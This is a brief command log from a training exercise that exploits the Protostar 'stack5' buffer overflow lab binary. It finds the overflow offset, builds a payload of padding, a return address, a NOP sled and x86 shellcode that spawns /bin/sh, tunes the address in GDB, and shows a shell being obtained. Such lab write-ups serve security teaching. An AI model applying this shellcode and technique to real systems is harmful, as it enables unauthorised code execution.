#Commands used to gain information needed to exploit stack5.c

#figure out where the buffer overflow occurs
user@protostar:~$ python -c "print 'A' * 76" | ./stack5
user@protostar:~$ python -c "print 'A' * 75" | ./stack5
Segmentation fault


#add your NOPs and Shellcode now, so you can run in GDB and get your return address for EIP
user@protostar:~$ vi ./exploit.py
print 'A' * 76 + '\x41\x41\x41\x41' + '\x90' * 20 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

user@protostar:~$ python ./exploit.py > /tmp/exploit

user@protostar:~$ cat /tmp/exploit
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������������������1�Ph//shh/bin��P��S���

#run gdb and get your return address to add into your exploit code
user@protostar:~$ gdb ./stack5
gdb$ b main
gdb$ r < /tmp/exploit
gdb$ i r
gdb$ x/300xb $esp-64

#update exploit code
user@protostar:~$ vi ./exploit.py
print 'A' * 76 + '\xe4\xf7\xff\xbf' + '\x90' * 20 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

user@protostar:~$ python ./exploit.py > /tmp/exploit
user@protostar:~$ cat /tmp/exploit AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������������������������1�Ph//shh/bin��P��S���


user@protostar:~$ gdb ./stack5
gdb$ r < /tmp/exploit
Executing new program: /bin/dash

Program exited normally.
--------------------------------------------------------------------------[regs]
  EAX:Error while running hook_stop:
No registers.


user@protostar:~$ (cat /tmp/exploit; cat) | /opt/protostar/bin/stack5
whoami
user
pwd
/home/user

#done - this isn't perfect, as it requires hands-on work, but i'll work on getting this to be dynamic in later exercises
